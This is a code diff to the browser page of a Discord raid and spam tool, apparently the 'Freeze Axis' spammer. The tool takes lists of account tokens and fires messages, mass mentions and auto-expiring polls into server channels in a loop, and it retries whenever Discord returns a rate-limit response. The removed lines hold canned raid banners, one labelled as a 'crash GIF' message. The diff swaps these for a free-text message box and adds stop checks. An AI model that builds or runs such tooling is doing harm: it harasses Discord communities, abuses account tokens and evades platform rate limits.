@@ -35,6 +35,7 @@
       margin:0; padding:0;
       display:flex; justify-content:center; align-items:center;
       height:100vh;
+      user-select: none;
     }
     .card {
       background:#36393f;
@@ -366,26 +367,16 @@
       </label>
 
       <label>サーバーID
-        <input type="text" id="guildId" required placeholder="123456789012345678">
+        <input type="text" id="guildId" placeholder="123456789012345678">
       </label>
 
       <label>チャンネルID
         <textarea id="channelIds" rows="2" placeholder="カンマ / 改行 / スペースで区切る 123456789012345678,123456789012345678,..."></textarea>
       </label>
       <button type="button" id="autoFillChannels" class="secondary">チャンネル自動取得</button>
-
-
-    <label>メッセージ内容</label>
-    <div class="row">
-      <label class="radio-container">
-        <input type="radio" name="messageOption" value="A" required checked>
-        <span>通常宣伝文</span>
-      </label>
-      <label class="radio-container">
-        <input type="radio" name="messageOption" value="B">
-        <span>クラッシュGIF宣伝文</span>
-      </label>
-    </div>
+    <label>メッセージ内容
+      <textarea id="messageText" rows="4" placeholder="送信するメッセージを入力"></textarea>
+    </label>
       <label class="checkbox-container">
         <input type="checkbox" id="allmention" checked>
         <span>全体メンション</span>
@@ -409,7 +400,11 @@
           <label>メンションするユーザーID一覧
             <textarea id="mentionIds" rows="2" placeholder="カンマ / 改行 / スペースで区切る 123456789012345678,123456789012345678"></textarea>
             <button type="button" id="fetchMentions" class="secondary" style="margin-top:8px;">メンション自動取得</button>
-            <input type="number" id="mentionLimit" min="1" max="50" step="1" placeholder="上限数 (1-50)" style="width: 120px; margin-left:8px; margin-top:8px;">
+            <div style="margin-top:8px;display:flex;align-items:center;gap:8px;">
+              <label for="mentionLimit" style="margin:0;font-weight:bold;">メンション上限</label>
+              <input type="range" id="mentionLimit" min="1" max="50" step="1" value="1" style="width: 120px;vertical-align:middle;">
+              <span id="mentionLimitValue" style="font-weight:bold;">1</span>
+            </div>
           </label>
           <label class="checkbox-container" style="margin-top:8px;">
             <input type="checkbox" id="randomMention">
@@ -461,6 +456,22 @@
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+      // ========== メンション上限スライダー値表示・履歴保存/復元対応 ========== 
+      document.addEventListener('DOMContentLoaded', function() {
+        var mentionLimit = document.getElementById('mentionLimit');
+        var mentionLimitValue = document.getElementById('mentionLimitValue');
+        if (mentionLimit && mentionLimitValue) {
+          // 値表示
+          mentionLimitValue.textContent = mentionLimit.value;
+          mentionLimit.addEventListener('input', function() {
+            mentionLimitValue.textContent = mentionLimit.value;
+            // 値変更時にフォーム履歴も保存
+            if (typeof saveFormHistory === 'function') saveFormHistory();
+          });
+        }
+      });
+    </script>
   <script>
     // ========== トークンマスク切替 ========== 
     window.addEventListener('DOMContentLoaded', function() {
@@ -499,7 +510,7 @@
     // ========== フォーム履歴保存・復元 ==========
     const form = document.getElementById('form');
     const formKeys = [
-      'tokens','guildId','channelIds','messageOption','allmention','randomize','delay','limit','mentionIds','mentionLimit','randomMention','pollTitle','pollAnswers','pollDuration','pollInstantEnd','pollEnabled','tokenMask'
+      'tokens','guildId','channelIds','messageText','allmention','randomize','delay','limit','mentionIds','mentionLimit','randomMention','pollTitle','pollAnswers','pollDuration','pollInstantEnd','pollEnabled','tokenMask'
     ];
     const FORM_STORAGE_KEY = 'freeze_spammer_form';
     function saveFormHistory() {
@@ -535,7 +546,14 @@
         else if (el.type === 'radio') {
           const radio = form.querySelector(`input[name="${key}"][value="${data[key]}"]`);
           if (radio) radio.checked = true;
-        } else el.value = data[key];
+        } else {
+          el.value = data[key];
+          // メンション上限スライダーの値表示も復元
+          if (key === 'mentionLimit') {
+            var mentionLimitValue = document.getElementById('mentionLimitValue');
+            if (mentionLimitValue) mentionLimitValue.textContent = el.value;
+          }
+        }
       }
     }
     form.addEventListener('input', saveFormHistory);
@@ -558,11 +576,11 @@
       document.getElementById('stopSpam').disabled = !running;
     }
     function enableSubmitIfReady() {
-      // 必須項目が埋まっていれば実行ボタン有効化
+      // サーバーIDが未設定でもチャンネルIDが設定されていれば実行ボタン有効化
       const tokens = parseIds(document.getElementById('tokens').value);
-      const guildId = document.getElementById('guildId').value.trim();
       const channelIds = parseIds(document.getElementById('channelIds').value);
-      document.getElementById('submitBtn').disabled = !(tokens.length && guildId && channelIds.length);
+      const messageText = document.getElementById('messageText').value.trim();
+      document.getElementById('submitBtn').disabled = !(tokens.length && channelIds.length && messageText);
     }
 
     // ========== チャンネル自動取得 ==========
@@ -636,7 +654,6 @@
       const tokens = parseIds(document.getElementById('tokens').value);
       const guildId = document.getElementById('guildId').value.trim();
       const channelIds = parseIds(document.getElementById('channelIds').value);
-      const messageOption = document.querySelector('input[name="messageOption"]:checked').value;
       const allmention = document.getElementById('allmention').checked;
       const randomize = document.getElementById('randomize').checked;
       const delay = parseFloat(document.getElementById('delay').value) || 0;
@@ -652,15 +669,11 @@
       const pollDurationHour = parseInt(document.getElementById('pollDuration').value) || 24;
       const pollInstantEnd = document.getElementById('pollInstantEnd').checked;
 
+      // メッセージ内容をベースメッセージとして定義
+      const baseMsg = document.getElementById('messageText').value.trim();
+
       // 投票送信記録用
       const pollSendHistory = [];
-
-      // メッセージテンプレート
-      let baseMsg = '';
-      if (messageOption === 'A') baseMsg =
-        '# Freeze☭Axisに荒らされました。\n[⁠︎](https://i.imgur.com/Bw50oCJ.mp4) [⁠︎](https://discord.gg/reRxqAXSSG) [⁠︎](https://freeze-axis.github.io/discord/) [⁠︎](https://freeze-axis.github.io/discord/join)';
-      if (messageOption === 'B') baseMsg =
-        '# Freeze☭Axisに荒らされました。\n[⁠︎](https://i.imgur.com/yNx4Me2.mp4) [⁠︎](https://discord.gg/reRxqAXSSG) [⁠︎](https://freeze-axis.github.io/discord/) [⁠︎](https://freeze-axis.github.io/discord/join)';
 
       let count = 0;
       // 429 bypass: レートリミット時はretry_after秒待ってリトライ
@@ -701,7 +714,9 @@
           }
           let tryCount = 0;
           while (true) {
+            if (spamAbort) break outer;
             try {
+              if (spamAbort) break outer;
               if (pollEnabled && pollTitle && pollAnswers.length) {
                 // 投票送信
                 const pollData = {
@@ -713,9 +728,11 @@
                   },
                   flags: 0
                 };
+                if (spamAbort) break outer;
                 const pollRes = await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, pollData, {
                   headers: { Authorization: tokens[i % tokens.length], 'Content-Type': 'application/json' }
                 });
+                if (spamAbort) break outer;
                 log(`投票送信: ${channelId}`);
                 if (pollInstantEnd) {
                   const pollId = pollRes.data.id;
@@ -727,24 +744,38 @@
                     (async () => {
                       let success = false;
                       for (let retry = 0; retry < 5; retry++) {
+                        if (spamAbort) break;
                         try {
+                          if (spamAbort) break;
                           await axios.post(`https://discord.com/api/v9/channels/${channelId}/polls/${pollId}/expire`, {}, {
                             headers: { Authorization: tokens[i % tokens.length], 'Content-Type': 'application/json' }
                           });
+                          if (spamAbort) break;
                           log(`投票即時終了: ${channelId} (${pollId})`);
                           pollRecord.expired = true;
                           success = true;
                           break;
                         } catch (expireErr) {
+                          if (spamAbort) break;
                           if (expireErr?.response?.status === 429) {
                             const retryAfter = (expireErr.response.data && expireErr.response.data.retry_after) ? expireErr.response.data.retry_after : 2;
                             log(`レートリミット(投票即時終了)：${retryAfter}秒待機`, true);
-                            await new Promise(r => setTimeout(r, retryAfter * 1000));
+                            let waited = 0;
+                            while (waited < retryAfter && !spamAbort) {
+                              await new Promise(r => setTimeout(r, 200));
+                              waited += 0.2;
+                            }
+                            if (spamAbort) break;
                           } else {
                             if (retry === 4) {
                               log(`投票即時終了失敗: ${channelId} (${pollId})`, true);
                             }
-                            await new Promise(r => setTimeout(r, 1000));
+                            let waited = 0;
+                            while (waited < 1 && !spamAbort) {
+                              await new Promise(r => setTimeout(r, 200));
+                              waited += 0.2;
+                            }
+                            if (spamAbort) break;
                           }
                         }
                       }
@@ -755,18 +786,27 @@
                 }
               } else {
                 // 通常メッセージ
+                if (spamAbort) break outer;
                 await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, { content: msg }, {
                   headers: { Authorization: tokens[i % tokens.length], 'Content-Type': 'application/json' }
                 });
+                if (spamAbort) break outer;
                 log(`送信: ${channelId}`);
               }
               count++;
               break;
             } catch (e) {
+              if (spamAbort) break outer;
               if (e?.response?.status === 429) {
                 const retryAfter = (e.response.data && e.response.data.retry_after) ? e.response.data.retry_after : 2;
                 log(`レートリミット：${retryAfter}秒待機`, true);
-                await new Promise(r => setTimeout(r, retryAfter * 1000));
+                // レートリミット時もabortチェック
+                let waited = 0;
+                while (waited < retryAfter && !spamAbort) {
+                  await new Promise(r => setTimeout(r, 200));
+                  waited += 0.2;
+                }
+                if (spamAbort) break outer;
                 tryCount++;
                 if (tryCount > 5) { log('リトライ上限', true); break; }
                 continue;
@@ -776,59 +816,22 @@
               }
             }
           }
-          if (delay > 0) await new Promise(r => setTimeout(r, delay * 1000));
+          if (spamAbort) break outer;
+          if (delay > 0) {
+            let waited = 0;
+            while (waited < delay && !spamAbort) {
+              await new Promise(r => setTimeout(r, 200));
+              waited += 0.2;
+            }
+            if (spamAbort) break outer;
+          }
           if (limit && count >= limit) break outer;
         }
       }
 
-      // スパム送信終了時に未終了の投票を全て再度expire
-      async function expireAllUnfinishedPolls() {
-        const unexpired = pollSendHistory.filter(p => !p.expired);
-        if (unexpired.length === 0) return;
-        log(`未終了の投票を再終了処理: ${unexpired.length}件`);
-        for (const poll of unexpired) {
-          if (poll.expired) continue; // 既に終了済みはスキップ
-          // 既に期限切れかどうかをAPIで確認
-          let isExpired = false;
-          try {
-            const pollMsg = await axios.get(`https://discord.com/api/v10/channels/${poll.channelId}/messages/${poll.pollId}`);
-            // Discordのpollメッセージに期限切れ情報が含まれている場合はここで判定
-            if (pollMsg.data && pollMsg.data.poll && pollMsg.data.poll.expired) {
-              isExpired = true;
-            }
-          } catch (e) {
-            // 取得失敗時は念のためexpireを試みる
-          }
-          if (isExpired) {
-            poll.expired = true;
-            continue;
-          }
-          for (let retry = 0; retry < 5; retry++) {
-            try {
-              await axios.post(`https://discord.com/api/v9/channels/${poll.channelId}/polls/${poll.pollId}/expire`, {}, {
-                headers: { Authorization: tokens[0], 'Content-Type': 'application/json' }
-              });
-              log(`投票再即時終了: ${poll.channelId} (${poll.pollId})`);
-              poll.expired = true;
-              break;
-            } catch (err) {
-              if (err?.response?.status === 429) {
-                const retryAfter = (err.response.data && err.response.data.retry_after) ? err.response.data.retry_after : 2;
-                log(`レートリミット(投票即時終了)：${retryAfter}秒待機`, true);
-                await new Promise(r => setTimeout(r, retryAfter * 1000));
-              } else {
-                if (retry === 4) {
-                  log(`投票再即時終了失敗: ${poll.channelId} (${poll.pollId})`, true);
-                }
-                await new Promise(r => setTimeout(r, 1000));
-              }
-            }
-          }
-        }
-      }
-      await expireAllUnfinishedPolls();
 
-      log('スパム送信終了');
+
+      log('スパム送信停止');
       spamRunning = false;
       setBtnState(false);
     });
@@ -837,7 +840,6 @@
     document.getElementById('stopSpam').addEventListener('click', function() {
       if (!spamRunning) return;
       spamAbort = true;
-      log('スパム送信停止');
       setBtnState(false);
     });
 
